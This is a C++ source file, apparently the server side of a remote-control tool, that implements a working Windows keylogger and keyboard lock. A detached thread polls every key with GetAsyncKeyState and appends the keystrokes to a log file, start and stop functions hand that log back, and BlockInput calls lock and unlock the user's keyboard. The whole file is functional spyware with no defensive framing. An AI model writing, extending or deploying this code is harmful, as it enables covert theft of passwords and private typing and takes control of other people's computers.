#include "syscalls.h"

std::atomic<bool> keyloggerRunning = false;

void LOG(std::string input) {
	std::fstream LogFile;
	LogFile.open(KEYLOGGER_PATH, std::fstream::app);
	if (LogFile.is_open()) {
		LogFile << input << " ";
		LogFile.close();
	}
}

bool SpecialKeys(int S_Key) {
	int entry = specialKeys.find(S_Key) != specialKeys.end() ? S_Key : -1;
	if (entry != -1) {
		LOG(specialKeys.at(entry));
		return true;
	}
	return false;
}

static void Keylogger()
{
	unsigned char KEY;

	while (keyloggerRunning) {
		Sleep(10);
		for (KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {
					std::fstream LogFile;
					LogFile.open(KEYLOGGER_PATH, std::fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY) << " ";
						LogFile.close();
					}

				}
			}
		}
	}
}

bool startKeylogger(std::string& result) {
	if (keyloggerRunning) {
		result = "Keylogger already running";
		return false;
	}
	keyloggerRunning = true;

	std::filesystem::remove(KEYLOGGER_PATH);

	std::thread t(Keylogger);
	t.detach();
	result = "Keylogger started";

	return true;
}

bool stopKeylogger(std::string& result, std::ifstream& file) {
	if (!keyloggerRunning) {
		result = "Keylogger not running";
		return false;
	}

	keyloggerRunning = false;
	result = "Keylogger stopped";
	file.open(KEYLOGGER_PATH, std::fstream::in);

	return true;
}

bool lockKeyboard(std::string& result) {
	bool res = BlockInput(true);
	if (!res) {
		// Check if the server is running as administrator
		bool elevated = isElevated();
		if (!elevated)
			result = "Failed to lock keyboard. The server is not running as administrator.";
		else
			result = "Failed to lock keyboard. Keyboard may already be locked.";
		return false;
	}
	result = "Keyboard locked";
	return true;
}

bool unlockKeyboard(std::string& result) {
	bool res = BlockInput(false);
	if (!res) {
		result = "Failed to unlock keyboard. Keyboard may already be unlocked.";
		return false;
	}
	result = "Keyboard unlocked";
	return true;
}